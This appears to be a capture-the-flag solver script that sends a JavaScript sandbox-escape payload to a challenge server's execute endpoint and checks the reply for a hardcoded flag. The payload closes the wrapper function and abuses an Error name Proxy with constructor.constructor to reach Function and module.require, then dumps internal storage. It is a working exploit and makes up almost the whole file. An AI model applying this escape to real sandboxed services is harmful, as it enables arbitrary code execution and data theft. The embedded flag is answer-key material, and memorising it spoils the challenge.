#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from requests import post
from time import sleep

# Wait for server to start
for _ in range(5):
    try:
        r = post(
            'http://challenge:3000/api/execute',
            json={
                "script": '''
});(()=>{const r = new Error;r.name={toString:new Proxy((()=>''),{apply(r,t,o){throw o.constructor.constructor('return [...module.require(`util`).inspect(storage)].join(` `)')()}})};try{r.stack}catch(r){ return r; }
                '''.strip()
            }
        )
        r.raise_for_status()
    except:
        sleep(5)
        continue

    exit(0 if 'c r 3 { W 0 v v 5 3 R s _ 1 n 5 q 3 c 7 0 R _ G 4 d g 3 T ! ! 1 }' in r.text else 1)

exit(1)
